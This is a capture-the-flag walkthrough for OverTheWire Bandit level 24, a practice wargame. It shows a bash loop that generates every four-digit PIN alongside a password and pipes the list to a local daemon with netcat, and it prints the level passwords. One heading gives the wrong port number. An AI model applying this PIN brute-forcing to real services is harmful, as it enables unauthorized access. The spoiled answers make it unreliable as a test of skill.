# Bandit Level 24 --> Level 25
## Level Goal
A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.

## Solution

Make bash script generate list of passwords in tmp dir
```console
bandit24@bandit:~$ mkdir /tmp/bandlev25
bandit24@bandit:~$ cd /tmp/bandlev25
bandit24@bandit:/tmp/bandlev25$ nano script.sh
bandit24@bandit:/tmp/bandlev25$ cat script.sh
#!/bin/bash

for i  in  {0000..9999}
  do
    echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i" >> list.txt
  done
```

Change mode of script to make it executable then run it
```console
bandit24@bandit:/tmp/bandlev25$ chmod 777 script.sh
bandit24@bandit:/tmp/bandlev25$ ./script.sh
bandit24@bandit:/tmp/bandlev25$ ls
list.txt script.sh
```

Give passwords list to daemon on port 30001
```console
cat list.txt |  nc localhost 30002
```

## Password
> uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG

  
